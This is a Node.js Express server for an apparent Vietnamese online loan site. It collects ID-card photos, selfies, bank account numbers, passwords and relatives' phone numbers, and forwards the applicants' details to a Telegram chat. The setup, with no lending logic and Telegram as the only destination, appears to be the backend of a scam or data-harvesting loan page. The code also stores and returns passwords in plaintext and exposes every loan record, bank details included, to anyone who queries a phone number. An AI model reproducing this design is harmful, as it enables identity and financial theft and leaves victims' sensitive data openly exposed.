const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// PHỤC VỤ FILE TĨNH TỪ THƯ MỤC public
app.use(express.static(path.join(__dirname, 'public')));

// ĐỌC BOT TOKEN VÀ CHAT ID TỪ RENDER ENVIRONMENT
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// HÀM GỬI THÔNG BÁO TELEGRAM
async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('⚠️ Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trên Render Environment!');
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('✅ Gửi thông báo Telegram thành công!');
    } catch (e) {
        console.error('❌ Lỗi kết nối Telegram:', e.message);
    }
}

// BỘ NHỚ TẠM
let users = [];
let loans = [];

// API: ĐĂNG KÝ
app.post('/api/register', (req, res) => {
    const { name, phone, password } = req.body;
    if (!name || !phone || !password) return res.json({ success: false, message: 'Vui lòng nhập đầy đủ thông tin!' });
    if (users.find(u => u.phone === phone)) return res.json({ success: false, message: 'Số điện thoại này đã đăng ký!' });
    
    const newUser = { id: Date.now(), name, phone, password, completedLoans: 0 };
    users.push(newUser);

    sendTelegram(`🆕 <b>THÀNH VIÊN MỚI ĐĂNG KÝ</b>\n👤 <b>Họ tên:</b> ${name}\n📞 <b>SĐT:</b> ${phone}`);
    res.json({ success: true, user: newUser });
});

// API: NỘP HỒ SƠ VAY
const upload = multer({ dest: 'uploads/' });
app.post('/api/submit-loan', upload.fields([{ name: 'cccdFront' }, { name: 'selfie' }]), (req, res) => {
    const { fullName, phone, bankName, bankAccount, amount, days, relativeRelation, relativeName, relativePhone } = req.body;

    const user = users.find(u => u.phone === phone);
    const completedCount = user ? user.completedLoans : 0;

    if (completedCount < 3 && parseInt(amount) > 500000) {
        return res.json({ success: false, message: 'Khách hàng mới chỉ được vay tối đa 500.000 VNĐ!' });
    }

    const loanId = 'VAY' + Math.floor(100000 + Math.random() * 900000);
    const newLoan = { loanId, fullName, phone, bankName, bankAccount, amount: parseInt(amount), days: parseInt(days), relativeRelation, relativeName, relativePhone, status: 'Chờ duyệt', createdAt: new Date().toLocaleString('vi-VN') };
    loans.push(newLoan);

    sendTelegram(
        `🚨 <b>HỒ SƠ VAY MỚI (#${loanId})</b>\n` +
        `👤 <b>Họ tên:</b> ${fullName}\n` +
        `📞 <b>SĐT:</b> ${phone}\n` +
        `💰 <b>Số tiền:</b> ${parseInt(amount).toLocaleString('vi-VN')} VNĐ (${days} ngày)\n` +
        `🏦 <b>STK:</b> ${bankName} - ${bankAccount}\n` +
        `👨‍👩‍👧 <b>Người thân:</b> ${relativeName || 'N/A'} (${relativeRelation || 'N/A'} - ${relativePhone || 'N/A'})`
    );

    res.json({ success: true, loanId });
});

// API: TRA CỨU HỒ SƠ VAY
app.get('/api/search-loan/:phone', (req, res) => {
    const userLoans = loans.filter(l => l.phone === req.params.phone);
    res.json({ success: true, loans: userLoans });
});

// CHỈ ĐỊNH RÕ RÀNG VÀO public/index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
